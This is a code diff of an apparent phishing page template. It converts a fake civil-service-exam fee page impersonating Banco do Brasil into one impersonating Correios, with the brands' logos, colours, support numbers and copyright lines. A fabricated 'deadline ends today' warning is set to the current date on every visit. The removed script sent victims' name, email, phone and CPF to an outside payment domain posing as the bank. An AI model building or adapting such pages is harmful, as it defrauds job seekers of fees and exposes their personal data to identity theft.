@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banco do Brasil - Taxa de Inscrição</title>
+    <title>Correios - Taxa de Inscrição</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -33,8 +33,8 @@
             theme: {
                 extend: {
                     colors: {
-                        'bb-yellow': '#FEEF37',
-                        'bb-blue': '#003DA5',
+                        'correios-blue': '#003399',
+                        'correios-yellow': '#FFCC00',
                     }
                 }
             }
@@ -42,16 +42,16 @@
     </script>
 </head>
 <body class="bg-gray-50 min-h-screen flex flex-col">
-    <div class="bg-bb-yellow py-4 shadow-sm">
+    <div class="bg-correios-yellow py-4 shadow-sm">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://i.ibb.co/WvBH03fD/png-transparent-banco-do-brasil-hd-logo-thumbnail-removebg-preview-1.png" alt="Logo do Banco do Brasil" class="h-12 mb-2" />
+                <img src="https://logodownload.org/wp-content/uploads/2014/05/correios-logo-1-1.png" alt="Logo dos Correios" class="h-12 mb-2" />
                 <div>
-                    <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
+                    <p class="text-correios-blue text-[16px] leading-tight font-bold tracking-wide">
                         CONCURSO PÚBLICO 2025
                     </p>
-                    <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
-                        SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+                    <p class="text-correios-blue text-[12px] leading-tight tracking-wide">
+                        SELEÇÃO EXTERNA PARA MÚLTIPLOS CARGOS
                     </p>
                 </div>
             </div>
@@ -59,7 +59,7 @@
     </div>
 
     <!-- Blue bar -->
-    <div class="bg-bb-blue py-3 shadow-md">
+    <div class="bg-correios-blue py-3 shadow-md">
         <div class="container mx-auto px-4 flex items-center">
             <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
                 <div class="w-2 h-2 bg-white"></div>
@@ -82,7 +82,7 @@
                             <div>
                                 <p class="font-bold text-yellow-800 mb-2">AVISO IMPORTANTE</p>
                                 <p class="text-yellow-800">
-                                    Para finalizar sua inscrição no Concurso Público do Banco do Brasil 2025, é necessário efetuar o pagamento da taxa de inscrição.
+                                    Para finalizar sua inscrição no Concurso Público dos Correios 2025, é necessário efetuar o pagamento da taxa de inscrição.
                                 </p>
                             </div>
                         </div>
@@ -102,38 +102,26 @@
                                 <i class="fas fa-clock text-red-600 text-xl mt-0.5 mr-3"></i>
                                 <div>
                                     <p class="font-bold text-red-800">PRAZO FINAL</p>
-                                    <p class="text-red-700">O prazo para pagamento da taxa de inscrição se encerra <span class="font-bold">hoje, 30/01/2025</span>.</p>
+                                    <p class="text-red-700">O prazo para pagamento da taxa de inscrição se encerra <span class="font-bold">hoje, {{ current_day }}/{{ current_month }}/{{ current_year }}</span>.</p>
                                 </div>
                             </div>
                         </div>
                     </div>
                 </div>
 
-                <a href="#" onclick="redirecionarPagamento()" 
-                   class="w-full bg-bb-blue hover:bg-opacity-90 text-white font-bold py-4 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 animate-pulse">
+                <a href="{{ url_for('pagamento') }}" 
+                   class="w-full bg-correios-blue hover:bg-opacity-90 text-white font-bold py-4 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 animate-pulse">
                     <span class="text-lg">PAGAR TAXA DE INSCRIÇÃO</span>
                     <i class="fas fa-lock ml-2"></i>
                 </a>
-
-                <script>
-                    function redirecionarPagamento() {
-                        const nomeCompleto = "{{ dados.name }}";
-                        const email = "{{ dados.email }}";
-                        const telefone = "{{ dados.phone }}";
-                        const cpf = "{{ dados.cpf }}";
-
-                        const url = `https://pay.finalizar-bb.org/nQ7kZ7kbynaZ0eJ?name=${encodeURIComponent(nomeCompleto)}&email=${encodeURIComponent(email)}&telephone=${encodeURIComponent(telefone)}&document=${encodeURIComponent(cpf)}`;
-                        window.location.href = url;
-                    }
-                </script>
             </div>
         </div>
     </div>
 
     <!-- Footer -->
-    <div class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto shadow-inner">
-        <p class="text-sm font-medium">© {{ current_year }} Banco do Brasil S.A. Todos os direitos reservados.</p>
-        <p class="text-sm mt-1">Central de Atendimento BB - 0800 729 0722</p>
+    <div class="bg-correios-yellow text-correios-blue text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} Empresa Brasileira de Correios e Telégrafos. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento dos Correios - 0800 725 0100</p>
     </div>
 </body>
 </html>
